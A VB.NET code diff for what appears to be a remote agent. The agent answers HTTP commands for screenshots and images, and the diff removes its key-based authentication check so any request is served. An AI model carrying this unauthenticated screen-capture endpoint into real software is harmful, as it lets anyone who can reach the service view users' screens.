@@ -112,22 +112,11 @@ Namespace Alduin.Stump.Class.Commands
                 Case "GetAllImgJson"
                     Return AllImgToJson.Handler()
             End Select
-            Dim url As String = RequestSplitter(request, 1) ' Handle HTTP request
-            Dim sourcehash As String
-            Dim remotehash As String
-            Using sha256Hash As SHA256 = SHA256.Create()
-                sourcehash = HashKey.GetHash(sha256Hash, GetConfigJson().KeyCertified)
-                remotehash = HashKey.GetHash(sha256Hash, RequestSplitter(request, 3))
-            End Using
-            If sourcehash <> remotehash Then
-                Dim log As LogModel = New LogModel With {
-                            .Message = "Key not equals!",
-                            .KeyUnique = GetConfigJson().KeyUnique,
-                            .Type = "Error"
-                    }
-                Return JsonConvert.SerializeObject(log)
-            End If
-            Select Case url 'Domain/method/value/key
+            Dim splittedHeader As String = RequestSplitter(request, 1, " ")
+            Dim url As String = RequestSplitter(splittedHeader, 0, "?")
+            Dim GetAttr As String = RequestSplitter(url, 1, "/") ' Handle HTTP request
+            Dim Attr As String = RequestSplitter(splittedHeader, 1, "?").Replace("%20", " ")
+            Select Case GetAttr 'Domain/method/value/key
                 Case "Forbidden"
                     Return "Forbidden"
                 Case "GetScreenShot"
@@ -139,7 +128,7 @@ Namespace Alduin.Stump.Class.Commands
                     }
                     Return JsonConvert.SerializeObject(log)
                 Case "GetImg"
-                    GetImg.Handler(RequestSplitter(request, 2), client)
+                    GetImg.Handler(Attr, client)
                     Dim log As LogModel = New LogModel With {
                             .Message = "ok",
                             .KeyUnique = GetConfigJson().KeyUnique,
@@ -167,15 +156,11 @@ Namespace Alduin.Stump.Class.Commands
                 Return ""
             End Try
         End Function
-        Public Function RequestSplitter(ByVal model As String, ByVal index As Integer)
+        Public Function RequestSplitter(ByVal model As String, ByVal index As Integer, ByVal splitchar As Char) As String
             Try
-                Dim header As String() = model.Split(New Char() {" "c})
-                Dim splitUrl As String() = header(1).Split(New Char() {"/"c})
-                If splitUrl(3) = Main.Config.Variables.CertifiedKey Then
-                    Return splitUrl(index)
-                Else
-                    Return "Forbidden"
-                End If
+                Dim splitUrl As String() = model.Split(New Char() {splitchar})
+                Return splitUrl(index)
+
             Catch ex As Exception
                 Return "Forbidden"
             End Try
